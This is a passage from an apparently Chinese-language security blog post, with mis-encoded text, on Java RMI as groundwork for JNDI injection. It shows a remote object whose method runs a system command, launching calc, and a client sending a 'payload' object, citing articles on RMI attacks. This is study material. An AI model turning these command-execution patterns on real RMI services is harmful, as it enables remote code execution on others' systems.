class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RMITest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testcalc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayObject</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMITestImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RMITest</span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RMITestImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testcalc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayObject</span><span class="hljs-params">(Object obj)</span> &#123;<br>        System.out.println(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/RMI-JNDI/7.png" alt="7"></p><p>æŠ„äº†ä¸‹<a href="https://blog.csdn.net/uuzeray/article/details/135886709?ops_request_misc=%7B%22request_id%22:%22172199251516800186550713%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172199251516800186550713&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-135886709-null-null.nonecase&utm_term=RMI&spm=1018.2226.3001.4450">ã€å¿ƒå¾—ã€‘java JNDIé…åˆRMIå®ç°æ³¨å…¥ä¸ªäººç¬”è®°_${jndi:rmi:-CSDNåšå®¢</a>ï¼ˆæˆ‘æ˜¯æ‡’ç‹—ï¼‰</p><p>åŸç†å¾ˆç®€å•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>ã€å®šä¹‰è¿œç¨‹æ¥å£ (RMITest.java):  <br>Â· å®šä¹‰äº†ä¸€ä¸ªè¿œç¨‹æ¥å£ RMITestï¼Œå…¶ä¸­åŒ…å«ä¸¤ä¸ªæ–¹æ³• testcalc() å’Œ sayObject(Object obj)ã€‚<br>è¿™äº›æ–¹æ³•å£°æ˜æŠ›å‡º RemoteExceptionï¼Œä»¥ä¾¿åœ¨è¿œç¨‹è°ƒç”¨æ—¶å¤„ç†å¯èƒ½çš„ç½‘ç»œé—®é¢˜ã€‚<br><br><span class="hljs-number">2</span>ã€å®ç°è¿œç¨‹æ¥å£ (RMITestImpl.java):  <br>Â· RMITestImpl ç±»å®ç°äº† RMITest æ¥å£ï¼Œå¹¶ç»§æ‰¿äº† UnicastRemoteObjectï¼Œä½¿å…¶æˆä¸ºä¸€ä¸ªè¿œç¨‹å¯¹è±¡ã€‚<br>Â· åœ¨ testcalc() æ–¹æ³•ä¸­ï¼Œä½¿ç”¨ Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>) æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¼¹å‡ºè®¡ç®—å™¨ã€‚<br>Â· sayObject(Object obj) æ–¹æ³•ç®€å•åœ°æ‰“å°ä¼ å…¥çš„å¯¹è±¡ã€‚<br><br><span class="hljs-number">3</span>ã€åˆ›å»ºå¹¶å¯åŠ¨RMIæœåŠ¡å™¨ (RMIServer.java):  <br>Â· åœ¨ main æ–¹æ³•ä¸­ï¼Œåˆ›å»º RMITestImpl çš„å®ä¾‹ã€‚<br>Â· ä½¿ç”¨ LocateRegistry.createRegistry(<span class="hljs-number">8081</span>) åˆ›å»ºä¸€ä¸ªåœ¨ç«¯å£ <span class="hljs-number">8081</span> ä¸Šç›‘å¬çš„ RMI æ³¨å†Œè¡¨ã€‚<br>Â· å°† RMITestImpl å®ä¾‹ç»‘å®šåˆ°æ³¨å†Œè¡¨ä¸­ï¼Œåç§°ä¸º <span class="hljs-string">&quot;EddieMurphy&quot;</span>ã€‚<br>Â· æ‰“å°ä¸€æ¡æ¶ˆæ¯è¡¨ç¤ºæœåŠ¡å™¨æ­£åœ¨ç›‘å¬ã€‚<br><br><span class="hljs-number">4</span>ã€åˆ›å»ºå¹¶å¯åŠ¨RMIå®¢æˆ·ç«¯ (RMIClient.java):  <br>Â· åœ¨ main æ–¹æ³•ä¸­ï¼Œä½¿ç”¨ LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">8081</span>) è·å–æœåŠ¡å™¨çš„æ³¨å†Œè¡¨ã€‚<br>Â· ä½¿ç”¨ registry.lookup(<span class="hljs-string">&quot;EddieMurphy&quot;</span>) æŸ¥æ‰¾è¿œç¨‹å¯¹è±¡ï¼Œå¹¶å°†å…¶å¼ºåˆ¶è½¬æ¢ä¸º RMITest æ¥å£ã€‚<br>Â· è°ƒç”¨ rmiTest.sayObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">payload</span>()) æ–¹æ³•ï¼Œä¼ é€’ä¸€ä¸ª payload å¯¹è±¡ã€‚<br>Â· è°ƒç”¨ rmiTest.testcalc() æ–¹æ³•ï¼Œæ‰§è¡Œè¿œç¨‹æ–¹æ³•ï¼Œå¼¹å‡ºè®¡ç®—å™¨ã€‚<br></code></pre></td></tr></table></figure><p>åç»­çš„JNDIæ˜¯é‡å¤´æˆï¼Œlookupæ˜¯å…¸å‹çš„ç‰¹å¾ã€‚é‚£ä¹ˆJNDIç»“åˆRMIæ‰“æ³•å°±å…ˆç•™å¾…æŠ›ç –å¼•ç‰å§ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/prerequisites/rmi-and-jndi/rmi">RMI | Java (gitbook.io)</a></p><p><a href="https://su18.org/post/rmi-attack/">Java RMI æ”»å‡»ç”±æµ…å…¥æ·± | ç´ åå…« (su18.org)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
